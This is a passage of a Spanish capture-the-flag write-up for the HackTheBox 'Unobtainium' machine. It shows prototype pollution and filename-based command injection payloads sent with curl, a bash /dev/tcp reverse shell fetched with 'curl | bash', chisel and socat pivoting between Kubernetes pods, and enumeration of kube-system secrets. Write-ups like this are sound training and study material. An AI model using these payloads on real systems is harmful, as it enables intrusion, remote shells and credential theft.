</span></span></code></pre></div><p>Parece que es un OS Command Inejction muy simple.</p><p>Esto estÃ¡ muy bien, pero no podemos subir archivos, ya que el usuario Felamos no tiene el rol para hacerlo. Vamos a seguir enumerando&mldr;</p><p>En la funciÃ³n de subida de mensajes, vemos como se hace un merge sin sanitizaciÃ³n de prototype pollution</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>put</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>user</span> <span class=o>=</span> <span class=nx>findUser</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>auth</span> <span class=o>||</span> <span class=p>{});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>user</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>403</span><span class=p>).</span><span class=nx>send</span><span class=p>({</span><span class=nx>ok</span><span class=o>:</span> <span class=kc>false</span><span class=p>,</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Access denied&#39;</span><span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>message</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>icon</span><span class=o>:</span> <span class=s1>&#39;__&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>_</span><span class=p>.</span><span class=nx>merge</span><span class=p>(</span><span class=nx>message</span><span class=p>,</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>message</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>id</span><span class=o>:</span> <span class=nx>lastId</span><span class=o>++</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>timestamp</span><span class=o>:</span> <span class=nb>Date</span><span class=p>.</span><span class=nx>now</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>    <span class=nx>userName</span><span class=o>:</span> <span class=nx>user</span><span class=p>.</span><span class=nx>name</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>messages</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=nx>message</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>({</span><span class=nx>ok</span><span class=o>:</span> <span class=kc>true</span><span class=p>});</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span></code></pre></div><p>Podemos intentar hacer un prototype pollution y poner canUpload en true, el prototype pollution lo podemos colar en req.body.message.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -X PUT <span class=se>\ </span>                                                                                                                                                                
</span></span><span class=line><span class=cl>  -H <span class=s2>&#34;Content-Type: application/json&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  -d <span class=s1>&#39;{
</span></span></span><span class=line><span class=cl><span class=s1>        &#34;auth&#34;: {
</span></span></span><span class=line><span class=cl><span class=s1>            &#34;name&#34;: &#34;felamos&#34;,
</span></span></span><span class=line><span class=cl><span class=s1>            &#34;password&#34;: &#34;Winter2021&#34;
</span></span></span><span class=line><span class=cl><span class=s1>        },   
</span></span></span><span class=line><span class=cl><span class=s1>        &#34;message&#34;: {
</span></span></span><span class=line><span class=cl><span class=s1>            &#34;test&#34;: &#34;something&#34;,
</span></span></span><span class=line><span class=cl><span class=s1>            &#34;__proto__&#34;: {
</span></span></span><span class=line><span class=cl><span class=s1>                &#34;canUpload&#34;: true
</span></span></span><span class=line><span class=cl><span class=s1>            }
</span></span></span><span class=line><span class=cl><span class=s1>        }
</span></span></span><span class=line><span class=cl><span class=s1>    }&#39;</span> <span class=se>\ </span>
</span></span><span class=line><span class=cl>  http://unobtainium.htb:31337
</span></span></code></pre></div><p>Ahora TODOS los usuarios tendrÃ¡n el canUpload en true.</p><pre tabindex=0><code>â”Œâ”€â”€(d3boã‰¿kali)-[~/Downloads]
â””â”€$ curl -X POST unobtainium.htb:31337/upload -H &#34;Content-Type: application/json&#34; -d &#39;{&#34;auth&#34;: { &#34;name&#34;: &#34;felamos&#34;, &#34;password&#34;: &#34;Winter2021&#34; },&#34;filename&#34;: &#34;malicious-script.js&#34;}&#39;                              
{&#34;ok&#34;:false,&#34;error&#34;:&#34;Access denied&#34;}                 



â”Œâ”€â”€(d3boã‰¿kali)-[~/Downloads]
â””â”€$ curl -X PUT -H &#34;Content-Type: application/json&#34; -d &#39;{&#34;auth&#34;: {&#34;name&#34;: &#34;felamos&#34;, &#34;password&#34;: &#34;Winter2021&#34;}, &#34;message&#34;: {&#34;test&#34;: &#34;something&#34;,&#34;__proto__&#34;: {&#34;canUpload&#34;: true}}}&#39; http://unobtainium.htb:31337
{&#34;ok&#34;:true}


â”Œâ”€â”€(d3boã‰¿kali)-[~/Downloads]
â””â”€$ curl -X POST unobtainium.htb:31337/upload -H &#34;Content-Type: application/json&#34; -d &#39;{&#34;auth&#34;: { &#34;name&#34;: &#34;felamos&#34;, &#34;password&#34;: &#34;Winter2021&#34; },&#34;filename&#34;: &#34;malicious-script.js&#34;}&#39;                              
{&#34;ok&#34;:true,&#34;Uploaded_File&#34;:&#34;malicious-script.js&#34;}                                                                                                                                                                                                                                            
</code></pre><p>Ya podemos subir archivos!</p><p>Si recordamos el CVE que detectamos anteriormente, podemos usarlo para ejecutar comandos. Para comprobar que tenemos ejecuciÃ³n remota de comandos, nos ponemos en escucha de paquetes icmp con tcpdump por la interfaz tun 0</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo tcpdump -i tun0 icmp
</span></span></code></pre></div><p>Y mandamos el payload</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ curl -X POST unobtainium.htb:31337/upload -H <span class=s2>&#34;Content-Type: application/json&#34;</span> -d <span class=s1>&#39;{&#34;auth&#34;: { &#34;name&#34;: &#34;felamos&#34;, &#34;password&#34;: &#34;Winter2021&#34; },&#34;filename&#34;: &#34;&amp; ping -c 1 10.10.14.47&#34;}&#39;</span> 
</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;ok&#34;</span>:true,<span class=s2>&#34;Uploaded_File&#34;</span>:<span class=s2>&#34;&amp; ping -c 1 10.10.14.47&#34;</span><span class=o>}</span>
</span></span></code></pre></div><p>Funicona!!!</p><p>Nos llega el paquete icmp</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>16:18:51.721013 IP unobtainium.htb &gt; 10.10.14.47: ICMP <span class=nb>echo</span> request, id 51165, seq 1, length <span class=m>64</span>
</span></span><span class=line><span class=cl>16:18:51.721055 IP 10.10.14.47 &gt; unobtainium.htb: ICMP <span class=nb>echo</span> reply, id 51165, seq 1, length <span class=m>64</span>
</span></span></code></pre></div><p>Para conseguir la reverse shell creamos un archivo llamado shell y dentro le ponemos el cÃ³digo de la reverse shell, y posteriormente creamos un servidor con python para poder acceder a este archivo desde la mÃ¡quina vÃ­ctima</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat shell 
</span></span><span class=line><span class=cl>bash -c <span class=s2>&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.47/443 0&gt;&amp;1&#34;</span>
</span></span><span class=line><span class=cl>                                                                                                                                                                              
</span></span><span class=line><span class=cl>$ python3 -m http.server <span class=m>80</span>
</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port <span class=m>80</span> <span class=o>(</span>http://0.0.0.0:80/<span class=o>)</span> ...
</span></span></code></pre></div><p>Nos ponemos en escucha por el puerto 443 para recibir la reverse shell</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -nlvp <span class=m>443</span>
</span></span></code></pre></div><p>Y por Ãºltimo mandamos el payload</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -X POST unobtainium.htb:31337/upload -H <span class=s2>&#34;Content-Type: application/json&#34;</span> -d <span class=s1>&#39;{&#34;auth&#34;: { &#34;name&#34;: &#34;felamos&#34;, &#34;password&#34;: &#34;Winter2021&#34; },&#34;filename&#34;: &#34;&amp; curl 10.10.14.47/shell | bash&#34;}&#39;</span>
</span></span></code></pre></div><p>Ya tenemos la reverse shell</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ nc -nlvp <span class=m>443</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>443</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.47<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.235<span class=o>]</span> <span class=m>9372</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>1<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>root@webapp-deployment-9546bc7cb-zjnnh:/usr/src/app# 
</span></span></code></pre></div><p>Antes de seguir, vamos a hacer un tratamiento de la tty para poder ejecutar <code>ctr + c</code>, <code>ctrl + l</code>, nano&mldr;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>script /dev/null -c bash
</span></span></code></pre></div><p>ctrl + z</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>stty raw -echo<span class=p>;</span> <span class=nb>fg</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>reset xterm
</span></span></code></pre></div><p>Ahora si hacemos un <code>echo $TERM</code> vemos que vale dumb, pero para poder hacer <code>ctrl + l</code> necesitamos que valga xterm</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span></code></pre></div><p>Por Ãºltimo si miramos la shell que tenemos <code>echo $SHELL</code> vemos que tenemos <code>/usr/sbin/nologin</code> asi que vamos a asignar una bash</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>export</span> <span class=nv>SHELL</span><span class=o>=</span>bash
</span></span></code></pre></div><h2 id=escalada-de-privilegios>Escalada de privilegios<a href=#escalada-de-privilegios class=anchor aria-hidden=true>#</a></h2><p>Estamos dentro de un contenedor como root, asÃ­ que tenemos que conseguir salir. Para enumerar el contenedor usamos linpeas.sh, que es una herramienta para automatizar el reconocimiento para escaladas de privilegios y contendores.</p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/hackthebox/unobtainium/images/kubernetes_hud1d78a8fc8a09dd8b3cb5ddc93035c18_88440_27828a9234e0a7f4fd081fc0de659ae0.webp 480w, /writeups/hackthebox/unobtainium/images/kubernetes_hud1d78a8fc8a09dd8b3cb5ddc93035c18_88440_abb1c4e725c0a23320860e4943782df4.webp 640w, /writeups/hackthebox/unobtainium/images/kubernetes_hud1d78a8fc8a09dd8b3cb5ddc93035c18_88440_2a5efaaad05a440d5c18c57556246d8e.webp 800w, /writeups/hackthebox/unobtainium/images/kubernetes_hud1d78a8fc8a09dd8b3cb5ddc93035c18_88440_de535b6bf2e97979a2d522e4e70deffb.webp 1024w" fetchpriority=low height=900 id=h-rh-i-7 src=/writeups/hackthebox/unobtainium/images/kubernetes_hud1d78a8fc8a09dd8b3cb5ddc93035c18_88440_ffea4137dc263b8d9e6de006afc1af9a.webp width=1600></p><p>Para enumerar kubernetes vamos a subir el binario kubectl a la mÃ¡quina</p><p>Comprobamos si podemos listar namespaces</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@webapp-deployment-9546bc7cb-zjnnh:~# ./kubectl auth can-i list namespaces
</span></span><span class=line><span class=cl>Warning: resource <span class=s1>&#39;namespaces&#39;</span> is not namespace scoped
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>yes
</span></span></code></pre></div><p>Efectivamente, podemos, asÃ­ que los listamos</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@webapp-deployment-9546bc7cb-zjnnh:~# ./kubectl get namespaces
</span></span><span class=line><span class=cl>NAME              STATUS   AGE
</span></span><span class=line><span class=cl>default           Active   659d
</span></span><span class=line><span class=cl>kube-system       Active   659d
</span></span><span class=line><span class=cl>kube-public       Active   659d
</span></span><span class=line><span class=cl>kube-node-lease   Active   659d
</span></span><span class=line><span class=cl>dev               Active   659d
</span></span></code></pre></div><p>Hay una namespace que llama la atenciÃ³n por su nombre <code>dev</code>, lo que podemos hacer ahora es listar los pods del namespace dev</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@webapp-deployment-9546bc7cb-zjnnh:~# ./kubectl get pods -n dev
</span></span><span class=line><span class=cl>NAME                                  READY   STATUS    RESTARTS       AGE
</span></span><span class=line><span class=cl>devnode-deployment-776dbcf7d6-g4659   1/1     Running   <span class=m>6</span> <span class=o>(</span>235d ago<span class=o>)</span>   659d
</span></span><span class=line><span class=cl>devnode-deployment-776dbcf7d6-7gjgf   1/1     Running   <span class=m>6</span> <span class=o>(</span>235d ago<span class=o>)</span>   659d
</span></span><span class=line><span class=cl>devnode-deployment-776dbcf7d6-sr6vj   1/1     Running   <span class=m>6</span> <span class=o>(</span>235d ago<span class=o>)</span>   659d
</span></span></code></pre></div><p>Una vez tenemos los pods, hacemos un describe, para ver mÃ¡s info del primer pod</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./kubectl describe pods/devnode-deployment-776dbcf7d6-g4659 -n dev
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Name:             devnode-deployment-776dbcf7d6-g4659
</span></span><span class=line><span class=cl>Namespace:        dev
</span></span><span class=line><span class=cl>Priority:         <span class=m>0</span>
</span></span><span class=line><span class=cl>Service Account:  default
</span></span><span class=line><span class=cl>Node:             unobtainium/10.10.10.235
</span></span><span class=line><span class=cl>Start Time:       Mon, <span class=m>29</span> Aug <span class=m>2022</span> 09:32:21 +0000
</span></span><span class=line><span class=cl>Labels:           <span class=nv>app</span><span class=o>=</span>devnode
</span></span><span class=line><span class=cl>                  pod-template-hash<span class=o>=</span>776dbcf7d6
</span></span><span class=line><span class=cl>Annotations:      &lt;none&gt;
</span></span><span class=line><span class=cl>Status:           Running
</span></span><span class=line><span class=cl>IP:               10.42.0.62
</span></span><span class=line><span class=cl>IPs:
</span></span><span class=line><span class=cl>  IP:           10.42.0.62
</span></span><span class=line><span class=cl>Controlled By:  ReplicaSet/devnode-deployment-776dbcf7d6
</span></span><span class=line><span class=cl>Containers:
</span></span><span class=line><span class=cl>  devnode:
</span></span><span class=line><span class=cl>    Container ID:   docker://733280337cc5998774d1a54dd9c8d0bc59f09053952f497050267389b18c08a9
</span></span><span class=line><span class=cl>    Image:          localhost:5000/node_server
</span></span><span class=line><span class=cl>    Image ID:       docker-pullable://localhost:5000/node_server@sha256:e965afd6a7e1ef3093afdfa61a50d8337f73cd65800bdeb4501ddfbc598016f5
</span></span><span class=line><span class=cl>    Port:           3000/TCP
</span></span><span class=line><span class=cl>    Host Port:      0/TCP
</span></span><span class=line><span class=cl>    State:          Running
</span></span><span class=line><span class=cl>      Started:      Tue, <span class=m>18</span> Jun <span class=m>2024</span> 11:08:53 +0000
</span></span><span class=line><span class=cl>    Last State:     Terminated
</span></span><span class=line><span class=cl>      Reason:       Error
</span></span><span class=line><span class=cl>      Exit Code:    <span class=m>137</span>
</span></span><span class=line><span class=cl>      Started:      Fri, <span class=m>27</span> Oct <span class=m>2023</span> 15:17:48 +0000
</span></span><span class=line><span class=cl>      Finished:     Fri, <span class=m>27</span> Oct <span class=m>2023</span> 15:24:53 +0000
</span></span><span class=line><span class=cl>    Ready:          True
</span></span><span class=line><span class=cl>    Restart Count:  <span class=m>6</span>
</span></span><span class=line><span class=cl>    Environment:    &lt;none&gt;
</span></span><span class=line><span class=cl>    Mounts:
</span></span><span class=line><span class=cl>      /root/ from user-flag <span class=o>(</span>rw<span class=o>)</span>
</span></span><span class=line><span class=cl>      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-ww6h2 <span class=o>(</span>ro<span class=o>)</span>
</span></span><span class=line><span class=cl>Conditions:
</span></span><span class=line><span class=cl>  Type              Status
</span></span><span class=line><span class=cl>  Initialized       True 
</span></span><span class=line><span class=cl>  Ready             True 
</span></span><span class=line><span class=cl>  ContainersReady   True 
</span></span><span class=line><span class=cl>  PodScheduled      True 
</span></span><span class=line><span class=cl>Volumes:
</span></span><span class=line><span class=cl>  user-flag:
</span></span><span class=line><span class=cl>    Type:          HostPath <span class=o>(</span>bare host directory volume<span class=o>)</span>
</span></span><span class=line><span class=cl>    Path:          /opt/user/
</span></span><span class=line><span class=cl>    HostPathType:  
</span></span><span class=line><span class=cl>  kube-api-access-ww6h2:
</span></span><span class=line><span class=cl>    Type:                    Projected <span class=o>(</span>a volume that contains injected data from multiple sources<span class=o>)</span>
</span></span><span class=line><span class=cl>    TokenExpirationSeconds:  <span class=m>3607</span>
</span></span><span class=line><span class=cl>    ConfigMapName:           kube-root-ca.crt
</span></span><span class=line><span class=cl>    ConfigMapOptional:       &lt;nil&gt;
</span></span><span class=line><span class=cl>    DownwardAPI:             <span class=nb>true</span>
</span></span><span class=line><span class=cl>QoS Class:                   BestEffort
</span></span><span class=line><span class=cl>Node-Selectors:              &lt;none&gt;
</span></span><span class=line><span class=cl>Tolerations:                 node.kubernetes.io/not-ready:NoExecute <span class=nv>op</span><span class=o>=</span>Exists <span class=k>for</span> 300s
</span></span><span class=line><span class=cl>                             node.kubernetes.io/unreachable:NoExecute <span class=nv>op</span><span class=o>=</span>Exists <span class=k>for</span> 300s
</span></span><span class=line><span class=cl>Events:                      &lt;none&gt;
</span></span></code></pre></div><p>Este pod tiene la ip 10.42.0.62 y el puerto 3000 abierto y nosotros estamos en la 10.42.0.70.</p><p>Si hacemos un curl al puerto 3000 del pod, parece que estÃ© funcionando el mismo servicio que hemos vulnerado en el contenedor 10.42.0.70</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@webapp-deployment-9546bc7cb-zjnnh:~# curl 10.42.0.62:3000
</span></span><span class=line><span class=cl><span class=o>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@webapp-deployment-9546bc7cb-zjnnh:~# curl 10.42.0.70:3000
</span></span><span class=line><span class=cl><span class=o>[{</span><span class=s2>&#34;icon&#34;</span>:<span class=s2>&#34;__&#34;</span>,<span class=s2>&#34;test&#34;</span>:<span class=s2>&#34;something&#34;</span>,<span class=s2>&#34;id&#34;</span>:1,<span class=s2>&#34;timestamp&#34;</span>:1718714423614,<span class=s2>&#34;userName&#34;</span>:<span class=s2>&#34;felamos&#34;</span><span class=o>}]</span>root@webapp-deployment-9546bc7cb-zjnnh:~# 
</span></span></code></pre></div><p>Lo que podemos intentar es vulnerar el contenedor que estÃ¡ dentro del namespace dev y ver si tenemos algÃºn tipo de privilegio especial dentro del contenedor</p><p>Para ello vamos a hacer un poco de pivoting&mldr;</p><p>Primero nos pasamos a la mÃ¡quina vÃ­ctima chisel y socat</p><p>Desde nuestra mÃ¡quina abrimos un servidor con chisel por el puerto 1234</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./chisel server --reverse -p <span class=m>1234</span>
</span></span></code></pre></div><p>Desde la mÃ¡quina vÃ­ctima nos conectamos a ese servidor</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./chisel client 10.10.14.47:1234 R:socks <span class=p>&amp;</span>
</span></span></code></pre></div><p>DespuÃ©s en el archivo de configuraciÃ³n de proxychains abajo del todo aÃ±adimos</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>socks5  127.0.0.1 <span class=m>1080</span>
</span></span></code></pre></div><p>Ahora ya deberÃ­amos poder hacer un curl al puerto 3000 del pod del namespace dev desde nuestra mÃ¡quina</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo proxychains curl 10.42.0.62:3000 2&gt;/dev/null
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[]</span>
</span></span></code></pre></div><p>Explotamos el prototype pollution</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo proxychains curl -X PUT -H <span class=s2>&#34;Content-Type: application/json&#34;</span> -d <span class=s1>&#39;{&#34;auth&#34;: {&#34;name&#34;: &#34;felamos&#34;, &#34;password&#34;: &#34;Winter2021&#34;}, &#34;message&#34;: {&#34;test&#34;: &#34;something&#34;,&#34;__proto__&#34;: {&#34;canUpload&#34;: true}}}&#39;</span> http://10.42.0.62:3000 2&gt;/dev/null
</span></span></code></pre></div><p>Para mandar la reverse shell, nos la podrÃ­amos mandar directamente, pero no me apetece, asÃ­ que vamos a usar socat, para mandar la reverse shell al primer contendor y que el primer contenedor la redirija a nosotros con socat.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat shell2               
</span></span><span class=line><span class=cl>bash -c <span class=s2>&#34;bash -i &gt;&amp; /dev/tcp/10.42.0.70/4433 0&gt;&amp;1&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ sudo python3 -m http.server <span class=m>80</span>
</span></span></code></pre></div><p>Ejecutamos el socat en el primer contenedor, para que redirija la reverse shell a nuestra mÃ¡quina.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./socat TCP-LISTEN:4433,fork TCP:10.10.14.47:4433
</span></span></code></pre></div><p>Ejecutamos un segundo socat para que cuando hagamos un curl para ver el cÃ³digo de la reverse shell a la ip 10.42.0.70 se redirija a nuestra ip</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./socat TCP-LISTEN:80,fork TCP:10.10.14.47:80
</span></span></code></pre></div><p>Nos ponemos en escucha por el puerto 4433</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -nlvp <span class=m>443</span>
</span></span></code></pre></div><p>Por Ãºltimo ejecutamos el payload y recibimos la shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo proxychains curl -X POST http://10.42.0.64:3000/upload -H <span class=s2>&#34;Content-Type: application/json&#34;</span> -d <span class=s1>&#39;{&#34;auth&#34;: { &#34;name&#34;: &#34;felamos&#34;, &#34;password&#34;: &#34;Winter2021&#34; },&#34;filename&#34;: &#34;&amp; curl 10.42.0.70/shell2 | bash&#34;}&#39;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -nlvp <span class=m>4433</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>4433</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.47<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.235<span class=o>]</span> <span class=m>24106</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>1<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>root@webapp-deployment-9546bc7cb-6r7sq:/usr/src/app# 
</span></span></code></pre></div><p>Dentro de este contenedor nos pasamos el kubectl para enumerar el kubernetes. Para pasarlo voy a aprovechar el socat que usamos antes, voy a hacer una peticiÃ³n a la 10.42.0.70/kubectl la cual el contenedor 10.42.0.70 la redirigirÃ¡ a mi mÃ¡quina.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wget 10.42.0.70/kubectl
</span></span></code></pre></div><p>Con kubectl podemos probar si en este contenedor tenemos permisos para enumerar secretos</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@webapp-deployment-9546bc7cb-6r7sq:~# ./kubectl auth can-i get secrets -n default
</span></span><span class=line><span class=cl>no
</span></span><span class=line><span class=cl>root@webapp-deployment-9546bc7cb-6r7sq:~# ./kubectl auth can-i get secrets -n kube-system
</span></span><span class=line><span class=cl>no
</span></span><span class=line><span class=cl>root@webapp-deployment-9546bc7cb-6r7sq:~# ./kubectl auth can-i get secrets -n kube-public
</span></span><span class=line><span class=cl>no
</span></span><span class=line><span class=cl>root@webapp-deployment-9546bc7cb-6r7sq:~# ./kubectl auth can-i get secrets -n kube-node-lease
</span></span><span class=line><span class=cl>no
</span></span><span class=line><span class=cl>root@webapp-deployment-9546bc7cb-6r7sq:~# ./kubectl auth can-i get secrets -n dev
</span></span><span class=line><span class=cl>no
</span></span></code></pre></div><p>No tenemos ningÃºn permiso distinto del otro pod. Dentro del namespace dev habÃ­a mÃ¡s contenedores, asÃ­ que vamos a probar de repetir el mismo proceso pero ahora para saltar al 10.42.0.62</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -nlvp <span class=m>4433</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>4433</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.47<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.235<span class=o>]</span> <span class=m>48507</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>1<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>root@devnode-deployment-776dbcf7d6-g4659:/usr/src/app# script /dev/null -c bash
</span></span><span class=line><span class=cl>&lt;bcf7d6-g4659:/usr/src/app# script /dev/null -c bash   
</span></span><span class=line><span class=cl>Script started, file is /dev/null
</span></span><span class=line><span class=cl>root@devnode-deployment-776dbcf7d6-g4659:/usr/src/app# 
</span></span></code></pre></div><p>Nos pasamos el kubectl</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wget 10.42.0.70/kubectl
</span></span></code></pre></div><p>Volvemos a probar si tenemos permisos para enumerar secretos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@devnode-deployment-776dbcf7d6-g4659:/usr/src/app# ./kubectl auth can-i get secrets -n default
</span></span><span class=line><span class=cl>no
</span></span><span class=line><span class=cl>root@devnode-deployment-776dbcf7d6-g4659:/usr/src/app# ./kubectl auth can-i get secrets -n kube-system
</span></span><span class=line><span class=cl>yes
</span></span></code></pre></div><p>Podemos enumerar los secretos del namespace kube-system</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@devnode-deployment-776dbcf7d6-g4659:/usr/src/app# ./kubectl get secrets -n kube-system
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>NAME                                                 TYPE                                  DATA   AGE
</span></span><span class=line><span class=cl>unobtainium.node-password.k3s                        Opaque                                <span class=m>1</span>      659d
</span></span><span class=line><span class=cl>horizontal-pod-autoscaler-token-2fg27                kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>coredns-token-jx62b                                  kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>local-path-provisioner-service-account-token-2tk2q   kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>statefulset-controller-token-b25sg                   kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>certificate-controller-token-98jdq                   kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>root-ca-cert-publisher-token-t564t                   kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>ephemeral-volume-controller-token-brb5h              kubernetes.io/service-account-token   <span class=m>3</span>      659d
</span></span><span class=line><span class=cl>ttl-after-finished-controller-token-wf8k9            kubernetes.io/service-account-token   <span class=m>3</span>      659d
